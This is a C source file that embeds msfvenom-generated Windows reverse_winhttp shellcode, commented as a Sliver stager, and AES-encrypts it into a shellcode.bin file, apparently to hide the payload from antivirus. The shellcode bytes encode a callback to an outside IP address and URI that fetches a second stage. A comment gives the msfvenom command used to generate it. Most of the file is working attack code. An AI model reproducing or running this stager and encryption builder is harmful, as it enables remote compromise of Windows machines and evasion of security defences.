#include <Windows.h>
#include <stdio.h>
#include "aes.h"

// the Visual Studio project should include:
// aes.h - https://github.com/kokke/tiny-AES-c/blob/master/aes.h
// aes.c - https://github.com/kokke/tiny-AES-c/blob/master/aes.c

#define KEYSIZE				32
#define IVSIZE				16

unsigned char Data[] = {
	// ... (sliver stager from msfvenom)
	// ... msfvenom -p windows/x64/custom/reverse_winhttp LHOST=<ip> LPORT=<port> LURI=/hello.woff -f c
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48"
"\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
"\x74\x67\x48\x01\xd0\x8b\x48\x18\x50\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6"
"\x4d\x31\xc9\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1"
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x41\x58"
"\x5e\x48\x01\xd0\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x48\x31\xdb\x53\x49\xbe\x77\x69\x6e"
"\x68\x74\x74\x70\x00\x41\x56\x48\x89\xe1\x49\xc7\xc2\x4c"
"\x77\x26\x07\xff\xd5\x53\x53\x48\x89\xe1\x53\x5a\x4d\x31"
"\xc0\x4d\x31\xc9\x53\x53\x49\xba\x04\x1f\x9d\xbb\x00\x00"
"\x00\x00\xff\xd5\x49\x89\xc4\xe8\x18\x00\x00\x00\x31\x00"
"\x30\x00\x2e\x00\x32\x00\x31\x00\x31\x00\x2e\x00\x35\x00"
"\x35\x00\x2e\x00\x32\x00\x00\x00\x5a\x48\x89\xc1\x49\xc7"
"\xc0\x50\x00\x00\x00\x4d\x31\xc9\x49\xba\x46\x9b\x1e\xc2"
"\x00\x00\x00\x00\xff\xd5\xe8\x54\x01\x00\x00\x68\x00\x74"
"\x00\x74\x00\x70\x00\x3a\x00\x2f\x00\x2f\x00\x31\x00\x30"
"\x00\x2e\x00\x32\x00\x31\x00\x31\x00\x2e\x00\x35\x00\x35"
"\x00\x2e\x00\x32\x00\x2f\x00\x68\x00\x65\x00\x6c\x00\x6c"
"\x00\x6f\x00\x2e\x00\x77\x00\x6f\x00\x66\x00\x66\x00\x2f"
"\x00\x2d\x00\x67\x00\x6c\x00\x6c\x00\x55\x00\x47\x00\x6c"
"\x00\x4c\x00\x79\x00\x55\x00\x49\x00\x66\x00\x55\x00\x52"
"\x00\x35\x00\x54\x00\x65\x00\x36\x00\x49\x00\x6a\x00\x47"
"\x00\x77\x00\x55\x00\x36\x00\x46\x00\x55\x00\x48\x00\x64"
"\x00\x69\x00\x65\x00\x41\x00\x57\x00\x78\x00\x68\x00\x56"
"\x00\x54\x00\x37\x00\x6e\x00\x4f\x00\x67\x00\x73\x00\x62"
"\x00\x33\x00\x37\x00\x6a\x00\x51\x00\x6c\x00\x62\x00\x67"
"\x00\x49\x00\x31\x00\x69\x00\x52\x00\x35\x00\x35\x00\x6c"
"\x00\x51\x00\x36\x00\x76\x00\x6a\x00\x39\x00\x74\x00\x45"
"\x00\x55\x00\x44\x00\x66\x00\x6c\x00\x6f\x00\x37\x00\x75"
"\x00\x43\x00\x46\x00\x43\x00\x55\x00\x76\x00\x55\x00\x2d"
"\x00\x41\x00\x72\x00\x41\x00\x74\x00\x56\x00\x67\x00\x34"
"\x00\x67\x00\x43\x00\x35\x00\x63\x00\x6d\x00\x31\x00\x6c"
"\x00\x56\x00\x56\x00\x66\x00\x75\x00\x35\x00\x42\x00\x32"
"\x00\x4a\x00\x33\x00\x4f\x00\x59\x00\x36\x00\x2d\x00\x6c"
"\x00\x68\x00\x68\x00\x73\x00\x74\x00\x2d\x00\x30\x00\x76"
"\x00\x56\x00\x35\x00\x42\x00\x6e\x00\x52\x00\x73\x00\x52"
"\x00\x43\x00\x59\x00\x4b\x00\x71\x00\x50\x00\x78\x00\x42"
"\x00\x4c\x00\x55\x00\x63\x00\x46\x00\x74\x00\x79\x00\x65"
"\x00\x72\x00\x53\x00\x31\x00\x4b\x00\x4f\x00\x61\x00\x00"
"\x00\x48\x89\xc1\x53\x5a\x41\x58\x4d\x89\xc5\x49\x83\xc0"
"\x24\x4d\x31\xc9\x53\x48\xc7\xc0\x00\x01\x00\x00\x50\x53"
"\x53\x49\xc7\xc2\x98\x10\xb3\x5b\xff\xd5\x48\x89\xc6\x48"
"\x83\xe8\x20\x48\x89\xe7\x48\x89\xf9\x49\xc7\xc2\x21\xa7"
"\x0b\x60\xff\xd5\x85\xc0\x0f\x84\x6d\x00\x00\x00\x48\x8b"
"\x47\x08\x85\xc0\x74\x3a\x48\x89\xd9\x48\xff\xc1\x48\xc1"
"\xe1\x20\x51\x53\x50\x48\xb8\x03\x00\x00\x00\x03\x00\x00"
"\x00\x50\x49\x89\xe0\x48\x83\xec\x20\x48\x89\xe7\x49\x89"
"\xf9\x4c\x89\xe1\x4c\x89\xea\x49\xc7\xc2\xda\xdd\xea\x49"
"\xff\xd5\x85\xc0\x74\x2d\xeb\x12\x48\x8b\x47\x10\x85\xc0"
"\x74\x23\x48\x83\xc7\x08\x6a\x03\x58\x48\x89\x07\x49\x89"
"\xf8\x6a\x18\x41\x59\x48\x89\xf1\x6a\x26\x5a\x49\xba\xd3"
"\x58\x9d\xce\x00\x00\x00\x00\xff\xd5\x6a\x0a\x5f\x53\x5a"
"\x48\x89\xf1\x4d\x31\xc9\x53\x53\x53\x53\x49\xba\x95\x58"
"\xbb\x91\x00\x00\x00\x00\xff\xd5\x85\xc0\x75\x0c\x48\xff"
"\xcf\x74\x02\xeb\xdd\xe8\x79\x00\x00\x00\x48\x89\xf1\x53"
"\x5a\x49\xc7\xc2\x05\x88\x9d\x70\xff\xd5\x85\xc0\x74\xe9"
"\x53\x48\x89\xe2\x53\x49\x89\xe1\x6a\x04\x41\x58\x48\x89"
"\xf1\x49\xc7\xc2\x6c\x29\x24\x7e\xff\xd5\x85\xc0\x74\xcd"
"\x48\x83\xc4\x28\x53\x59\x5a\x48\x89\xd3\x6a\x40\x41\x59"
"\x49\xc7\xc0\x00\x10\x00\x00\x49\xba\x58\xa4\x53\xe5\x00"
"\x00\x00\x00\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89"
"\xf1\x49\x89\xc0\x48\x89\xda\x49\x89\xf9\x49\xc7\xc2\x6c"
"\x29\x24\x7e\xff\xd5\x48\x83\xc4\x20\x85\xc0\x0f\x84\x84"
"\xff\xff\xff\x58\xc3\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5"
"\xa2\x56\xff\xd5"
};

// Generate random bytes of size sSize
VOID GenerateRandomBytes(PBYTE pByte, SIZE_T sSize) {

	for (int i = 0; i < sSize; i++) {
		pByte[i] = (BYTE)rand() % 0xFF;
	}
}

// Print the input buffer as a hex char array
VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {

	printf("unsigned char %s[] = {", Name);

	for (int i = 0; i < Size; i++) {
		if (i % 16 == 0) {
			printf("\n\t");
		}
		if (i < Size - 1) {
			printf("0x%0.2X, ", Data[i]);
		}
		else {
			printf("0x%0.2X ", Data[i]);
		}
	}

	printf("};\n\n\n");

}

// Function that will take a buffer, and copy it to another buffer that is a multiple of 16 in size
BOOL PaddBuffer(IN PBYTE InputBuffer, IN SIZE_T InputBufferSize, OUT PBYTE* OutputPaddedBuffer, OUT SIZE_T* OutputPaddedSize) {

	PBYTE	PaddedBuffer = NULL;
	SIZE_T	PaddedSize = NULL;

	// Calculate the nearest number that is multiple of 16 and saving it to PaddedSize
	PaddedSize = InputBufferSize + 16 - (InputBufferSize % 16);
	// Allocating buffer of size PaddedSize
	PaddedBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, PaddedSize);
	if (!PaddedBuffer) {
		return FALSE;
	}
	// Cleaning the allocated buffer
	ZeroMemory(PaddedBuffer, PaddedSize);
	// Copying old buffer to a new padded buffer
	memcpy(PaddedBuffer, InputBuffer, InputBufferSize);
	// Saving results
	*OutputPaddedBuffer = PaddedBuffer;
	*OutputPaddedSize = PaddedSize;

	return TRUE;
}

int main() {

	// Struct needed for tiny-AES library
	struct AES_ctx ctx;

	BYTE pKey[KEYSIZE];				// KEYSIZE is 32
	BYTE pIv[IVSIZE];				// IVSIZE is 16

	srand(time(NULL));				// The seed to generate the key
	GenerateRandomBytes(pKey, KEYSIZE);		// Generating the key bytes

	srand(time(NULL) ^ pKey[0]);			// The seed to generate the iv (using the first byte from the key to add more spice)
	GenerateRandomBytes(pIv, IVSIZE);		// Generating the IV

	// Printing key and IV to the console
	PrintHexData("pKey", pKey, KEYSIZE);
	PrintHexData("pIv", pIv, IVSIZE);

	printf("[i] Base Address of Shellcode : 0x%p \n", Data);
	printf("[!] Encrypting shellcode..\n");

	// Initilizing the Tiny-AES Library
	AES_init_ctx_iv(&ctx, pKey, pIv);

	// Initializing variables that will hold the new buffer base address and its size in case padding is required
	PBYTE	PaddedBuffer = NULL;
	SIZE_T	PAddedSize = NULL;

	HANDLE file;
	DWORD bytes_written;

	// Padding buffer, if needed
	if (sizeof(Data) % 16 != 0) {
		PaddBuffer(Data, sizeof(Data), &PaddedBuffer, &PAddedSize);
		// Encrypting the padded buffer instead
		AES_CBC_encrypt_buffer(&ctx, PaddedBuffer, PAddedSize);
		// Printing the encrypted buffer to the console
		PrintHexData("CipherText", PaddedBuffer, PAddedSize);
		printf("[i] Base Address of Encrypted Shellcode (Padded) : 0x%p \n", PaddedBuffer);

		size_t encshellcodeSize = PAddedSize;
		file = CreateFileA("shellcode.bin", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL, NULL);
		if (file == INVALID_HANDLE_VALUE) {
			printf("Unable to create bin file.\n");
			return 1;
		}

		if (!WriteFile(file, PaddedBuffer, (DWORD)encshellcodeSize, &bytes_written, NULL)) {
			fprintf(stderr, "Failed to write to file.\n");
			CloseHandle(file);
			return 1;
		}

		printf("shellcode.bin file created!");

		//clean up
		CloseHandle(file);
	}
	else {
		// No padding is required, encrypt Data directly
		AES_CBC_encrypt_buffer(&ctx, Data, sizeof(Data));
		// Printing the encrypted buffer to the console
		PrintHexData("CipherText", Data, sizeof(Data));
		printf("[i] Base Address of Encrypted Shellcode (Non-Padded) : 0x%p \n", Data);

		size_t encshellcodeSize = sizeof(Data);
		file = CreateFileA("shellcode.bin", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL, NULL);
		if (file == INVALID_HANDLE_VALUE) {
			printf("Unable to create bin file.\n");
			return 1;
		}

		if (!WriteFile(file, Data, (DWORD)encshellcodeSize, &bytes_written, NULL)) {
			fprintf(stderr, "Failed to write to file.\n");
			CloseHandle(file);
			return 1;
		}

		printf("shellcode.bin file created!");

		//clean up
		CloseHandle(file);
	}

	// Freeing PaddedBuffer, if needed
	if (PaddedBuffer != NULL) {
		HeapFree(GetProcessHeap(), 0, PaddedBuffer);
	}

	printf("[#] Press <Enter> To Quit ... ");
	getchar();
	return 0;

}